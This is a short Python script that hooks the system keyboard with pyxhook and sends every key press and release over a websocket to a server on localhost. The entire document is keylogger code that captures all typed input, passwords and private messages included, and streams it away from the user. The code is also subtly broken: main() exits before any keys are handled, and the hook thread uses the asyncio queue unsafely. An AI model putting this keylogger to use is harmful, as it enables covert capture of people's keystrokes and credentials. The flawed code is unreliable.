import asyncio
import websockets
import pyxhook

async def send_data(msg):
    uri = "ws://localhost:8765"
    async with websockets.connect(uri) as websocket:
        await websocket.send(msg)
        print(f"Sent: {msg}")

async def send_key(event):
    await send_data(event.Key)

async def keyboard_handler(queue):
    def on_key_up(event):
        queue.put_nowait(('up', event))

    def on_key_press(event):
        queue.put_nowait(('press', event))

    hook_manager = pyxhook.HookManager()
    hook_manager.KeyDown = on_key_press
    hook_manager.KeyUp = on_key_up
    hook_manager.HookKeyboard()
    hook_manager.start()  

    while True:
        event_type, event = await queue.get()
        if event_type == 'up':
            await send_key(event)
        elif event_type == 'press':
            await send_key(event)

async def main():
    queue = asyncio.Queue()
    asyncio.create_task(keyboard_handler(queue))
    # Run other tasks concurrently if needed

asyncio.run(main())
